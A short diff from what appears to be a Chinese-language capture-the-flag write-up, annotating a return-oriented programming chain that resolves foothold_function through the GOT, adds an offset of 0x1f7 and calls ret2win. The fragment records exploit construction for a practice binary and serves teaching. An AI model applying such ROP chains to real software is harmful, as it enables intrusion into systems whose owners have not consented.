@@ -88,11 +88,11 @@ Dump of assembler code for function usefulGadgets:
 ret: foothold_function@plt +
 ret: gadget1 +
 eax: foothold_function@got.plt +
-ret: gadget4 + 
+ret: gadget4 +   ---> eax = foothold_function() 的真实位址
 ret: gadget5 +
-ebx: 0x1f7 +
-ret: gadget3 +
-ret: gadget6
+ebx: offset +    ---> 0x1f7
+ret: gadget3 +   ---> add eax, ebx 之后，eax = ret2win() 的真实位址
+ret: gadget6     ---> call eax
 ```
 
 下面这段输入到第二次 fgets() 里：
